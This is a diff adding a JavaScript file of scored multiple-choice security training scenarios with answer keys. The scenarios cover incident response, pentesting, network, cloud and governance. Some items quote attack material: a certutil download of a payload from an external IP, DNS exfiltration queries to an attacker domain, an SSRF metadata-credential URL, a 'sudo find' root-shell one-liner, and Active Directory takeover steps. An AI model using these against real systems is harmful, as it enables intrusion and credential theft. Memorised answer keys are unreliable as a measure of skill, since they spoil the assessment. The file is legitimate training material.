@@ -1,0 +1,650 @@
+// Scenario-depth chains for the SecMox Score. One realistic scenario, then a
+// ladder of auto-scored steps that escalate: orient, act, investigate, scope.
+// The score rewards how far you climb correctly, so a pasted or guessed answer
+// breaks the streak at the first real follow-up.
+//
+// Each step: { label, prompt, type: 'mcq', options: [..], answer: <index>, explain }
+// chain difficulty doubles as its weight: 1 easy, 2 medium, 3 hard.
+
+export const SCORE_CHAINS = [
+  // ---------------- SOC ----------------
+  {
+    slug: 'ps-finance-workstation',
+    role: 'soc',
+    title: 'PowerShell on a finance workstation',
+    difficulty: 3,
+    scenario:
+      '2:14 AM. An EDR alert fires on FIN-WS-07, a finance workstation. The process tree:\n\n' +
+      'winword.exe\n' +
+      ' └─ powershell.exe -enc JABzPQBOZXctT2Jq...(base64)\n' +
+      '      └─ cmd.exe /c certutil -urlcache -f http://185.22.14.9/a.exe %TEMP%\\a.exe\n' +
+      '           └─ a.exe\n\n' +
+      'The user says they opened a supplier invoice about an hour ago.',
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'What is the most likely initial access vector?',
+        type: 'mcq',
+        options: [
+          'A drive-by download from web browsing',
+          'A malicious macro in the opened invoice',
+          'An RDP brute force',
+          'A dropped USB device',
+        ],
+        answer: 1,
+        explain: 'Office (winword) spawning PowerShell right after the user opened an attachment points to a malicious macro.',
+      },
+      {
+        label: 'First action',
+        prompt: 'The host is still powered on and online. What is your immediate action?',
+        type: 'mcq',
+        options: [
+          'Reimage the machine right away',
+          'Isolate the host from the network but keep it powered on',
+          'Shut the host down',
+          'Ask the user to run a full antivirus scan',
+        ],
+        answer: 1,
+        explain: 'Isolate to stop spread, but keep it running to preserve memory and live evidence.',
+      },
+      {
+        label: 'Investigate',
+        prompt: 'certutil pulled a.exe from 185.22.14.9. Which single source best confirms a.exe ran and made outbound connections?',
+        type: 'mcq',
+        options: [
+          'The email gateway logs',
+          "The host's EDR process and network telemetry",
+          'The domain controller security log',
+          "The firewall's allow-rule list",
+        ],
+        answer: 1,
+        explain: 'EDR on the host shows process execution and the outbound connections a.exe made.',
+      },
+      {
+        label: 'Scope',
+        prompt: 'You confirm a.exe beacons to 185.22.14.9 every ~60s. Best next step to find other compromised hosts?',
+        type: 'mcq',
+        options: [
+          "Block the user's account",
+          'Pivot on 185.22.14.9 across endpoint and proxy logs to find other hosts contacting it',
+          'Reset all finance passwords',
+          'Run antivirus on FIN-WS-07 again',
+        ],
+        answer: 1,
+        explain: 'The C2 IP is the pivot: any other host talking to it is likely also compromised.',
+      },
+    ],
+  },
+  {
+    slug: 'brute-then-new-admin',
+    role: 'soc',
+    title: 'Brute force, then a new Domain Admin',
+    difficulty: 2,
+    scenario:
+      '3:02 AM. A detection fires. The service account svc-backup had 240 failed logons from 10.0.44.9 in 4 minutes, then one success. Within the next 2 minutes that account created a new user "helpdesk-adm" and added it to Domain Admins.',
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'What does this pattern indicate?',
+        type: 'mcq',
+        options: [
+          'A misconfigured backup job',
+          'A successful password brute force followed by privilege escalation',
+          'A routine administrative task',
+          'A DNS resolution problem',
+        ],
+        answer: 1,
+        explain: 'Mass failures then a success, immediately followed by creating a Domain Admin, is brute force into escalation.',
+      },
+      {
+        label: 'First action',
+        prompt: 'What is the first containment step?',
+        type: 'mcq',
+        options: [
+          'Disable svc-backup and the new helpdesk-adm account',
+          'Reboot the domain controller',
+          'Delete the security logs',
+          'Email the account owner',
+        ],
+        answer: 0,
+        explain: 'Cut off the compromised and attacker-created accounts first.',
+      },
+      {
+        label: 'Investigate',
+        prompt: 'To understand what the attacker did after gaining Domain Admin, which is most valuable?',
+        type: 'mcq',
+        options: [
+          'The DC logon (4624/4672) and account-change (4720/4728) events',
+          'The printer logs',
+          'The DHCP leases',
+          'The web proxy alone',
+        ],
+        answer: 0,
+        explain: 'Those events show the privileged logons and the account changes the attacker made.',
+      },
+      {
+        label: 'Scope',
+        prompt: 'The attacker had Domain Admin. Which is the LEAST safe to assume is cleaned by just disabling the two accounts?',
+        type: 'mcq',
+        options: [
+          'Deeper persistence: new scheduled tasks/GPOs and possible krbtgt (Golden Ticket) exposure',
+          'The two disabled accounts',
+          'The source IP 10.0.44.9',
+          'The failed-logon noise',
+        ],
+        answer: 0,
+        explain: 'With DA, the attacker may have planted persistence or stolen krbtgt; disabling two accounts does not clear that.',
+      },
+    ],
+  },
+
+  // ---------------- Pentest ----------------
+  {
+    slug: 'linux-web-foothold',
+    role: 'pentest',
+    title: 'Foothold on a Linux web server',
+    difficulty: 2,
+    scenario:
+      'You have a www-data shell on a Linux web server after a file-upload bug. `sudo -l` returns:\n\n' +
+      '    (ALL) NOPASSWD: /usr/bin/find\n\n' +
+      'You also notice /opt/scripts/backup.sh is world-writable and run by root via cron every minute.',
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'Which is the most direct path to root right now?',
+        type: 'mcq',
+        options: [
+          'The passwordless sudo on /usr/bin/find',
+          'Recompiling the kernel',
+          "Brute forcing root's password",
+          'Waiting for a reboot',
+        ],
+        answer: 0,
+        explain: 'sudo find is instant via its -exec; the writable cron also works but takes up to a minute.',
+      },
+      {
+        label: 'Exploit',
+        prompt: 'How do you abuse `sudo find` to get a root shell?',
+        type: 'mcq',
+        options: [
+          'sudo find . -exec /bin/sh \\; -quit',
+          'sudo find / -name root',
+          'sudo find --version',
+          'sudo find / -type f',
+        ],
+        answer: 0,
+        explain: "find's -exec runs a command; with sudo that command (/bin/sh) runs as root.",
+      },
+      {
+        label: 'Act in scope',
+        prompt: 'You are root. For the engagement, what is the right first action?',
+        type: 'mcq',
+        options: [
+          'Capture proof (id, hostname, the target/flag) and note the time, per scope',
+          'Delete the system logs',
+          'Install a hidden backdoor for later',
+          'Email the client the password',
+        ],
+        answer: 0,
+        explain: 'A pentest documents access with proof; it does not destroy logs or plant unauthorized backdoors.',
+      },
+      {
+        label: 'Report',
+        prompt: 'Which finding is the root cause worth the highest severity?',
+        type: 'mcq',
+        options: [
+          'The passwordless sudo on find and the world-writable root cron (direct privilege escalation)',
+          'The Apache version banner',
+          'An outdated jQuery include',
+          'A missing security header',
+        ],
+        answer: 0,
+        explain: 'Both give a direct path to root; that is critical, far above an info-level banner.',
+      },
+    ],
+  },
+  {
+    slug: 'ad-user-to-da',
+    role: 'pentest',
+    title: 'Active Directory: user to Domain Admin',
+    difficulty: 3,
+    scenario:
+      'On an internal test you hold a standard domain user. BloodHound shows:\n\n' +
+      'YOU → member of → IT-Support → GenericWrite over → svc-sql → member of → Server Admins → local admin on → DC01',
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'What does GenericWrite over svc-sql let you do?',
+        type: 'mcq',
+        options: [
+          'Read its current password directly',
+          'Take over svc-sql (e.g. set a fake SPN and Kerberoast, or a targeted reset)',
+          'Delete the whole domain',
+          'Nothing useful',
+        ],
+        answer: 1,
+        explain: 'GenericWrite enables a targeted takeover of the account, for example via a fake SPN then Kerberoast.',
+      },
+      {
+        label: 'Exploit',
+        prompt: 'Having taken over svc-sql (local admin on DC01), what is the cleanest path to Domain Admin?',
+        type: 'mcq',
+        options: [
+          'Dump credentials/secrets from DC01 with local admin (e.g. DCSync or LSASS)',
+          'Phish the real administrator',
+          'Brute force the Domain Admin password',
+          'Wait for an admin to log in',
+        ],
+        answer: 0,
+        explain: 'Local admin on a DC lets you extract domain secrets directly.',
+      },
+      {
+        label: 'Validate',
+        prompt: 'You obtain the krbtgt hash. What does that enable?',
+        type: 'mcq',
+        options: [
+          'A Golden Ticket: forge Kerberos tickets as any user, including Domain Admin',
+          'Only the ability to read email',
+          'Nothing of value',
+          'A denial of service',
+        ],
+        answer: 0,
+        explain: 'The krbtgt hash lets you forge TGTs for anyone (a Golden Ticket).',
+      },
+      {
+        label: 'Report',
+        prompt: 'What is the core misconfiguration to flag?',
+        type: 'mcq',
+        options: [
+          'An excessive ACL path (GenericWrite) from a low-privilege group to a privileged service account',
+          "The DC's uptime",
+          'A weak TLS cipher on an unrelated site',
+          'Verbose error pages',
+        ],
+        answer: 0,
+        explain: 'The whole chain exists because a low-priv group can write to a privileged account.',
+      },
+    ],
+  },
+
+  // ---------------- Network ----------------
+  {
+    slug: 'firewall-change-broke-app',
+    role: 'network',
+    title: 'A firewall change broke the app',
+    difficulty: 2,
+    scenario:
+      'After a 10:00 firewall change, users cannot reach the internal app at 10.20.0.50:443.\n' +
+      '- ping 10.20.0.50 succeeds\n' +
+      '- curl https://10.20.0.50 from a user subnet times out\n' +
+      '- on the server, the service is listening on 0.0.0.0:443',
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'Ping works but TCP 443 times out. What does this most suggest?',
+        type: 'mcq',
+        options: [
+          'DNS is down',
+          'A firewall/ACL is blocking TCP 443 to the server',
+          'The application crashed',
+          'A bad TLS certificate',
+        ],
+        answer: 1,
+        explain: 'ICMP succeeding while a TCP port times out points to a filtering rule, not the host or the app.',
+      },
+      {
+        label: 'Narrow it down',
+        prompt: 'Best next check to confirm?',
+        type: 'mcq',
+        options: [
+          'Test the port from the user subnet (e.g. nc -vz 10.20.0.50 443)',
+          'Reboot the application',
+          'Clear the browser cache',
+          'Renew the certificate',
+        ],
+        answer: 0,
+        explain: 'A direct port test from the affected subnet confirms whether 443 is reachable.',
+      },
+      {
+        label: 'Fix',
+        prompt: 'The change removed the allow rule for 443 from the user VLAN. Correct fix?',
+        type: 'mcq',
+        options: [
+          'Re-add a specific allow rule for TCP 443 from the user VLAN to 10.20.0.50',
+          'Disable the firewall',
+          'Allow all traffic everywhere',
+          'Move the app to port 80',
+        ],
+        answer: 0,
+        explain: 'Restore the least-privilege rule that was removed, nothing broader.',
+      },
+      {
+        label: 'Prevent',
+        prompt: 'What practice would have caught this before users did?',
+        type: 'mcq',
+        options: [
+          'Change control with a tested rollback and a post-change connectivity check',
+          'A faster internet link',
+          'A bigger firewall appliance',
+          'More RAM on the app server',
+        ],
+        answer: 0,
+        explain: 'Post-change validation and a rollback plan catch connectivity breaks immediately.',
+      },
+    ],
+  },
+  {
+    slug: 'dns-tunneling',
+    role: 'network',
+    title: 'Odd DNS traffic from one host',
+    difficulty: 2,
+    scenario:
+      'On a span port you capture a repeating pattern from internal host 10.0.0.77:\n\n' +
+      '10.0.0.77 → resolver  DNS A  d2hhdGV2ZXI.exfil.attacker.com\n' +
+      '10.0.0.77 → resolver  DNS A  bW9yZWRhdGE.exfil.attacker.com\n' +
+      '(long random-looking subdomains, every few seconds)',
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'What is this most likely?',
+        type: 'mcq',
+        options: ['Normal web browsing', 'DNS tunneling / data exfiltration via subdomains', 'A printer discovering itself', 'NTP time sync'],
+        answer: 1,
+        explain: 'Steady, long, high-entropy subdomains under one external domain is classic DNS tunneling.',
+      },
+      {
+        label: 'Confirm',
+        prompt: 'Which detail most supports that?',
+        type: 'mcq',
+        options: [
+          'Long, high-entropy, base64-like subdomains under one attacker domain at steady intervals',
+          'The queries use a public resolver',
+          'The host is on an internal subnet',
+          'DNS uses UDP',
+        ],
+        answer: 0,
+        explain: 'The encoded, high-entropy labels carrying data are the tell, not the transport.',
+      },
+      {
+        label: 'Contain',
+        prompt: 'Immediate containment?',
+        type: 'mcq',
+        options: [
+          'Isolate 10.0.0.77 and sinkhole/block the attacker domain',
+          'Reboot the DNS resolver',
+          'Increase the DNS TTL',
+          'Do nothing yet',
+        ],
+        answer: 0,
+        explain: 'Cut the host off and stop resolution of the exfil domain.',
+      },
+      {
+        label: 'Prevent',
+        prompt: 'Which control best reduces this class of exfiltration?',
+        type: 'mcq',
+        options: [
+          'Egress DNS control: force internal resolvers, block direct outbound 53, and monitor for anomalous query patterns',
+          'Buy more bandwidth',
+          'Disable IPv6',
+          'Require longer user passwords',
+        ],
+        answer: 0,
+        explain: 'Controlling and monitoring egress DNS is the direct defence against tunneling.',
+      },
+    ],
+  },
+
+  // ---------------- Cloud ----------------
+  {
+    slug: 'public-s3-leaked-key',
+    role: 'cloud',
+    title: 'Public bucket with a leaked key',
+    difficulty: 2,
+    scenario:
+      "A researcher reports your S3 bucket 'acme-invoices' is publicly listable. Inside is config.env containing an AWS access key (AKIA...) and secret. CloudTrail shows that key made GetObject calls from an unfamiliar IP yesterday.",
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'What is the first and most urgent action?',
+        type: 'mcq',
+        options: [
+          'Delete the bucket',
+          'Rotate/disable the exposed AWS key immediately, then lock the bucket',
+          'Rename config.env',
+          'Reply to the researcher first',
+        ],
+        answer: 1,
+        explain: 'The live, already-used key is the active exposure; kill it first.',
+      },
+      {
+        label: 'Contain',
+        prompt: 'After disabling the key, how do you lock the data?',
+        type: 'mcq',
+        options: [
+          'Enable Block Public Access and remove the public policy/ACL on the bucket',
+          'Set the bucket to public-read-only',
+          'Move it to another region',
+          'Turn off CloudTrail',
+        ],
+        answer: 0,
+        explain: 'Block Public Access plus removing the public policy closes the exposure.',
+      },
+      {
+        label: 'Investigate',
+        prompt: 'To learn what the attacker accessed with that key, which source is right?',
+        type: 'mcq',
+        options: [
+          'CloudTrail events for that access key identity',
+          'The bucket name',
+          'The IAM user list only',
+          'The billing console',
+        ],
+        answer: 0,
+        explain: 'CloudTrail ties actions to the specific key identity.',
+      },
+      {
+        label: 'Scope',
+        prompt: 'The key belonged to a role with s3:* on all buckets. Beyond rotation, the key fix?',
+        type: 'mcq',
+        options: [
+          'Scope the role to least privilege (specific bucket + actions) and check other buckets for exposure',
+          'Add MFA to the researcher',
+          'Delete the CloudTrail logs',
+          'Raise the bucket size limit',
+        ],
+        answer: 0,
+        explain: 'The over-broad role is the systemic issue; scope it and review blast radius.',
+      },
+    ],
+  },
+  {
+    slug: 'ssrf-metadata',
+    role: 'cloud',
+    title: 'SSRF reaches the metadata endpoint',
+    difficulty: 3,
+    scenario:
+      'An image-fetch feature downloads a URL the user submits. A WAF log shows a user submitted:\n\n' +
+      'http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role\n\n' +
+      'and the response was 200 with JSON.',
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'What happened?',
+        type: 'mcq',
+        options: [
+          'A harmless health check',
+          'SSRF reached the instance metadata endpoint and returned IAM credentials',
+          'A normal DNS lookup',
+          'A CDN cache hit',
+        ],
+        answer: 1,
+        explain: 'The fetch feature was tricked into requesting the metadata endpoint, leaking role credentials.',
+      },
+      {
+        label: 'Impact',
+        prompt: 'What can the attacker now do?',
+        type: 'mcq',
+        options: [
+          "Use the leaked temporary credentials with the app-role's permissions",
+          'Only view an image',
+          'Nothing, they expire instantly',
+          'Restart the server',
+        ],
+        answer: 0,
+        explain: 'The credentials act as the role until they expire, giving the attacker its permissions.',
+      },
+      {
+        label: 'Contain',
+        prompt: 'Best immediate mitigation for the leaked creds and the SSRF?',
+        type: 'mcq',
+        options: [
+          'Rotate/revoke the role sessions, block the metadata IP, and validate/allowlist fetch URLs',
+          'Increase the instance size',
+          'Disable logging',
+          'Change the region',
+        ],
+        answer: 0,
+        explain: 'Kill the stolen session and stop the fetch feature reaching internal addresses.',
+      },
+      {
+        label: 'Prevent',
+        prompt: 'Which single control best prevents this class going forward?',
+        type: 'mcq',
+        options: [
+          'Enforce IMDSv2 (token-bound) and strict egress/URL allowlisting on the fetch feature',
+          'A stronger admin password',
+          'Public read on the bucket',
+          'Longer log retention only',
+        ],
+        answer: 0,
+        explain: 'IMDSv2 plus URL allowlisting removes the easy SSRF-to-credentials path.',
+      },
+    ],
+  },
+
+  // ---------------- GRC ----------------
+  {
+    slug: 'vendor-wants-data',
+    role: 'grc',
+    title: 'A vendor wants customer data',
+    difficulty: 2,
+    scenario:
+      "A new marketing vendor wants API access to your customer database (names, emails, purchase history) to 'personalize campaigns'. The business wants it live next week.",
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'What should happen first?',
+        type: 'mcq',
+        options: [
+          'Grant access to hit the deadline',
+          'A vendor risk and data-protection assessment before any access',
+          'Refuse outright',
+          'Give read access to everything',
+        ],
+        answer: 1,
+        explain: 'Assess the risk and the data-protection implications before granting access.',
+      },
+      {
+        label: 'Scope',
+        prompt: 'What principle governs which data to share?',
+        type: 'mcq',
+        options: [
+          'Share the whole database for flexibility',
+          'Data minimization: only the fields the use case needs, pseudonymized where possible',
+          'Share nothing, ever',
+          'Let the vendor decide',
+        ],
+        answer: 1,
+        explain: 'Share the minimum necessary, not the whole dataset.',
+      },
+      {
+        label: 'Control',
+        prompt: 'Which control is essential before go-live?',
+        type: 'mcq',
+        options: [
+          'A Data Processing Agreement plus scoped, auditable, time-bound access',
+          'A verbal agreement',
+          'Unlimited API keys',
+          "Trust in the vendor's reputation",
+        ],
+        answer: 0,
+        explain: 'A DPA and least-privilege, auditable access put the arrangement on a defensible footing.',
+      },
+      {
+        label: 'Monitor',
+        prompt: 'After go-live, what sustains the control?',
+        type: 'mcq',
+        options: [
+          "Periodic access review, monitoring of the vendor's API use, and re-assessment on any scope change",
+          'Nothing further is needed',
+          'Deleting the logs monthly',
+          'Annual price renegotiation',
+        ],
+        answer: 0,
+        explain: 'Access and usage must be reviewed and monitored over time, not just at onboarding.',
+      },
+    ],
+  },
+  {
+    slug: 'client-ransomware-board',
+    role: 'grc',
+    title: 'Client ransomware, and the board asks questions',
+    difficulty: 3,
+    scenario:
+      'A client you advise on security governance is hit by ransomware. Systems are down. The board asks you: what now, and what do we tell regulators and customers?',
+    steps: [
+      {
+        label: 'Orient',
+        prompt: 'What should drive the response?',
+        type: 'mcq',
+        options: [
+          'Improvise as you go',
+          'The incident response plan, and for disclosure the breach-notification obligations',
+          'Pay the ransom immediately',
+          'Blame the IT team',
+        ],
+        answer: 1,
+        explain: 'A rehearsed IR plan drives the response; legal obligations drive disclosure.',
+      },
+      {
+        label: 'Prioritise',
+        prompt: 'What is the right order of early intent?',
+        type: 'mcq',
+        options: [
+          'Contain and preserve evidence, assess scope, then restore from clean backups',
+          'Pay first, ask questions later',
+          'Wipe everything immediately',
+          'Issue a public statement before anything else',
+        ],
+        answer: 0,
+        explain: 'Contain, understand scope, and recover from known-good backups.',
+      },
+      {
+        label: 'Disclosure',
+        prompt: 'What determines whether and when you must notify regulators and customers?',
+        type: 'mcq',
+        options: [
+          "The CEO's preference",
+          'Whether personal/regulated data was affected and the applicable legal notification timelines',
+          "Marketing's calendar",
+          "The ransom note's deadline",
+        ],
+        answer: 1,
+        explain: 'Notification duties turn on the data affected and the law, not internal preference.',
+      },
+      {
+        label: 'Afterwards',
+        prompt: 'The strongest governance lesson to institutionalise?',
+        type: 'mcq',
+        options: [
+          'Buy more cyber insurance only',
+          'Tested backups, least privilege and segmentation, and a rehearsed IR and comms plan',
+          'Hire more staff only',
+          'Avoid discussing it',
+        ],
+        answer: 1,
+        explain: 'Resilience comes from tested recovery, containment by design, and practised response.',
+      },
+    ],
+  },
+];
